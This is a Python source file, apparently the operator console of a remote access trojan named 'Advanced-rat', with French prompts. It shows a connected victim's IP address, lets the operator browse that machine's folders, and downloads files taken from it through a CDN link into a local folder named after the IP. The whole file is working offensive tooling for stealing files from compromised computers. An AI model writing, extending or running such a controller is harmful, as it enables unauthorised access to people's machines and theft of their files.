from requests import get
from pystyle import *




banner1 = r'''

                                                                      
                            ,,                                        
 $$$$$$\  $$$$$$$\  $$\    $$\  $$$$$$\  $$\   $$\  $$$$$$\  $$$$$$$$\ $$$$$$$\          $$$$$$$\   $$$$$$\ $$$$$$$$\ 
$$  __$$\ $$  __$$\ $$ |   $$ |$$  __$$\ $$$\  $$ |$$  __$$\ $$  _____|$$  __$$\         $$  __$$\ $$  __$$\\__$$  __|
$$ /  $$ |$$ |  $$ |$$ |   $$ |$$ /  $$ |$$$$\ $$ |$$ /  \__|$$ |      $$ |  $$ |        $$ |  $$ |$$ /  $$ |  $$ |   
$$$$$$$$ |$$ |  $$ |\$$\  $$  |$$$$$$$$ |$$ $$\$$ |$$ |      $$$$$\    $$ |  $$ |$$$$$$\ $$$$$$$  |$$$$$$$$ |  $$ |   
$$  __$$ |$$ |  $$ | \$$\$$  / $$  __$$ |$$ \$$$$ |$$ |      $$  __|   $$ |  $$ |\______|$$  __$$< $$  __$$ |  $$ |   
$$ |  $$ |$$ |  $$ |  \$$$  /  $$ |  $$ |$$ |\$$$ |$$ |  $$\ $$ |      $$ |  $$ |        $$ |  $$ |$$ |  $$ |  $$ |   
$$ |  $$ |$$$$$$$  |   \$  /   $$ |  $$ |$$ | \$$ |\$$$$$$  |$$$$$$$$\ $$$$$$$  |        $$ |  $$ |$$ |  $$ |  $$ |   
\__|  \__|\_______/     \_/    \__|  \__|\__|  \__| \______/ \________|\_______/         \__|  \__|\__|  \__|  \__|
'''

banner2 = r'''
                                    
                                    _--_
                                   V   -B
                               ___V___V___
                  ____-----=~~VVVV  o  VVVV~~~==-----_____
                VV~VVVVVVVVVVVV~VV  O  VVVVVVVVVVVVVVVVVVVVV
              VVVVVVVVVVVVVVVVVVVVV o VVVVVVVVVVVVVVVVVVVVVVVV
             VVVVV~~~~~~~~~~~~~~~V V.VVV~~~~~~~~~~~~~~~~~`VVVVV
            VV~                  VVVVVV                      ~VV
                                VVVWWVWV
                               VVVVVVVVVV
                               ~~~~~~~~~~'''


banner = Add.Add(banner1, banner2)


class Tui:

    q, t, p = f"{Col.dark_gray}[{Col.light_red}?{Col.dark_gray}]", f"{Col.dark_gray}[{Col.light_red}!{Col.dark_gray}]", f"{Col.dark_gray}[{Col.light_red}.{Col.dark_gray}]"

    def Setup() -> None:
        System.Clear()
        System.Title('Advanced-rat')
        System.Size(150, 40)

    def MainPrint() -> None:
        System.Clear()
        return print(Colorate.Vertical(Colors.red_to_black, Center.XCenter(banner + '\n\n')))


    def Waiting() -> None:
        Tui.MainPrint()
        print(Tui.t + Col.dark_red + " En attente de connection...")
    
#     def Choose(ips: list) -> str:

#         System.Clear()
#         Tui.MainPrint()

#         bips = "".join(f"   ║{Col.gray} {ip.replace('.', f'{Col.light_red}.{Col.gray}')}{Col.dark_gray}\n" for ip in ips)

#         box = f"""   {Col.dark_gray}╔═══════════════════════╗
#    ║{Col.dark_red} Connected IPs {Col.light_red}-> {Col.gray}{len(ips)}{Col.dark_gray}
#    ║
# {bips}   ║
#    ╚═══════════════════════╝{Col.reset}\n\n"""
#         print(box)

#         ip = input(f"{Tui.q} {Col.dark_red}Choose an IP address to get files from (press '{Col.light_red}r{Col.dark_red}' to reload) {Col.dark_gray}-> {Col.gray}")
#         if ip == 'r':
#             return False
#         print('\n')
#         if ip not in ips:
#             input(Col.dark_red + f"{Tui.t} {Col.dark_red}'{Col.gray}{ip.replace('.', f'{Col.light_red}.{Col.gray}')}{Col.dark_red}' is not connected. Please choose another IP address.")
#             return False
        
#         input(f"{Tui.p} {Col.dark_red}Connecting to {Col.gray}{ip.replace('.', f'{Col.light_red}.{Col.gray}')}{Col.dark_red}... press enter to continue...{Col.gray}")
#         return ip



    def File(path: str, url: str, ip: str) -> bool:
        path = path.rstrip('/')

        Tui.MainPrint()

        box = f"""   {Col.dark_gray}╔{"═"*len(url)}══════════════════╗
   ║{Col.dark_red} IP de la victime {Col.light_red}-> {Col.gray}{ip}{Col.dark_gray}
   ║
   ║{Col.dark_red} chemin original {Col.light_red}-> {Col.gray}{path}{Col.dark_gray}
   ║
   ║{Col.dark_red} lien de téléchargement {Col.light_red}-> {Col.gray}{url}{Col.dark_gray}
   ╚{"═"*len(url)}══════════════════╝{Col.reset}\n\n"""
        print(box)


        if url != 'False':
            c = input(f"{Tui.q} {Col.dark_red}Souhaitez-vous télécharger le fichier [y/n] {Col.dark_gray}-> {Col.gray}")
            
            if c == 'y':
                filename = download(url=url, ip=ip)
                print(Col.dark_red + f'\n{Tui.t} {Col.dark_red}Le fichier a été téléchargé dans {Col.gray}{filename}{Col.gray}')
            print('\n')
            input(f"{Tui.p} {Col.dark_red}Appuyez sur Entrée pour continuer...{Col.gray}")
        else:
            input(f"{Tui.t} {Col.dark_red}Impossible d'accéder au fichier {Col.light_red}'{Col.gray}{path}{Col.light_red}'{Col.gray}")

        return 'DIR', "/".join(path.split('/')[:-1]) + '/'

    
    def Dir(path: str, listdir: dict, ip: str) -> str:

        System.Size(150, 40 + len(listdir))

        Tui.MainPrint()
        back = "" if path == 'C:/' else f"   ║ {Col.light_red}..{Col.dark_gray}\n"

        back += f"   ║ {Col.light_red}/{Col.dark_gray}\n"

        nlistdir = back + "".join(f"   ║ {Col.light_green if listdir[x] == 'FILE' else Col.light_blue}{x}{Col.dark_gray}\n" for x in listdir)

        box = f"""   {Col.dark_gray}╔{'═'*16 + '═'*len(ip)}╗
   ║{Col.dark_red} IP de la victime {Col.light_red}-> {Col.gray}{ip}{Col.dark_gray}
   ║
   ║{Col.dark_red} chemin original {Col.light_red}-> {Col.gray}{path}{Col.dark_gray}
   ║
   ║{Col.dark_red} listé {Col.light_green}files{Col.dark_red} et {Col.light_blue}directories{Col.dark_red} {Col.light_red}-> {Col.gray}{len(listdir)}{Col.dark_gray}
   ║
   ║
{nlistdir}   ╚═{'═'*len(list(listdir.keys())[-1])}╝{Col.reset}\n\n"""
        print(box)

        if listdir != 'FALSE':
            cpath = input(f"{Tui.q} {Col.dark_red}Choisissez le prochain chemin {Col.dark_gray}-> {Col.gray}")
            print('\n')
            nlistdir = {}
            for a, b in listdir.items():
                nlistdir[a] = b
            if path != "C:/": nlistdir['..'] = 'BACK'

            nlistdir['/'] = 'RELOAD'
            if cpath not in nlistdir:
                input(Col.dark_red + f"{Tui.t} {Col.light_red}'{Col.gray}{cpath}{Col.light_red}'{Col.dark_red} n'existe pas. Veuillez choisir un autre chemin.{Col.gray}")
                return Tui.Dir(path=path, listdir=listdir, ip=ip)
            if cpath == '..':
                method = 'DIR'
                path = '/'.join(path.split('/')[:-2]) + '/'
            elif cpath == '/':
                method = 'DIR'
            else:
                method = listdir[cpath]
                path += cpath + '/'
            
            print(f"{Tui.p} {Col.dark_red}Téléchargement {Col.light_red}'{Col.gray}{cpath}{Col.light_red}'{Col.dark_red}...{Col.gray}")
            
            return method, path
        else:
            input(f"{Tui.t} {Col.dark_red}Impossible d'accéder au répertoire {Col.light_red}'{Col.gray}{path}{Col.light_red}'{Col.gray}")
            return 'DIR', '/'.join(path.split('/')[:-2]) + '/'



def download(url: str, ip: str) -> str:

    filename = url.split('/')[-1].replace('_','.')
    filename = f'db/{ip}/{filename}'
    text = get(url).text
    direct_link = "https://cdn" + text.split('href="https://cdn')[1].split('">')[0]
    content = get(direct_link).content
    with open(filename, mode='wb') as f:
        f.write(content)
    return filename


Tui.Setup()
